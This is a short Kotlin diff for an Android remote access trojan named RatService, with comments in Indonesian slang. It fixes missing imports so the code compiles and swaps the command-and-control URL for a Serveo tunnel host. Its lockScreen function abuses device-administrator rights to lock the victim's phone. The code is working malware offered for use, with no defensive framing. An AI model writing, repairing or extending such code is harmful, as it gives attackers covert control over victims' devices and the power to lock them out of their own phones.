@@ -17,11 +17,16 @@ import org.json.JSONObject
 import java.io.InputStream
 import java.util.concurrent.TimeUnit
 
+// TAMBAHAN IMPORT BUAT FIX ERROR
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
+import android.app.WallpaperManager
+
 class RatService : Service() {
     private val client = OkHttpClient.Builder().connectTimeout(10, TimeUnit.SECONDS).build()
     
-    // URL SERVEO LO
-    private val c2Url = "https://13e84b2e0a836ee4-103-26-188-24.serveousercontent.com/api"
+    // GANTI URL SERVEO LO DI SINI
+    private val c2Url = "https://8ee83aba5866e5b5-103-26-188-24.serveousercontent.com"
     
     private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var deviceId = ""
@@ -155,6 +160,7 @@ class RatService : Service() {
 
     private fun lockScreen() {
         val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        // PASTIKAN IMPORT COMPONENTNAME ADA DI ATAS
         val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)
         if (dpm.isAdminActive(admin)) {
             dpm.lockNow()
